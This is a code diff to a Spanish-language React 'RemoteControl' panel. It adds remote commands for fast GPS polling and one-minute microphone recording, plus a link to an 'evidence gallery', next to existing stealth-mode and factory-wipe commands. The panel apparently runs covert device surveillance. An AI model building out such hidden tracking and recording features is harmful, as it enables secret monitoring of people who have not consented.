@@ -54,6 +54,8 @@ export default function RemoteControl() {
     { value: "wipe_data", label: "🗑️ Borrado de Fábrica", dangerous: true },
     { value: "enable_stealth", label: "👻 Activar Modo Oculto", dangerous: false },
     { value: "disable_stealth", label: "👁️ Desactivar Modo Oculto", dangerous: false },
+    { value: "set_gps_polling_speed", label: "🛰️ Frecuencia GPS (Rápida)", dangerous: false },
+    { value: "start_audio_recording", label: "🎙️ Grabar Micrófono (1m)", dangerous: false },
   ];
 
   const handleSendCommand = (commandType: string) => {
@@ -147,6 +149,12 @@ export default function RemoteControl() {
                     <TabsTrigger value="control">Comandos</TabsTrigger>
                     <TabsTrigger value="history">Historial Real</TabsTrigger>
                   </TabsList>
+
+                  <div className="mb-4 flex justify-end">
+                    <Button variant="link" size="sm" className="text-magenta-400 font-bold p-0" asChild>
+                      <a href="/media">Ir a Galería de Evidencia →</a>
+                    </Button>
+                  </div>
 
                   <TabsContent value="control" className="grid grid-cols-2 md:grid-cols-3 gap-3">
                     {commandTypes.map((cmd) => (
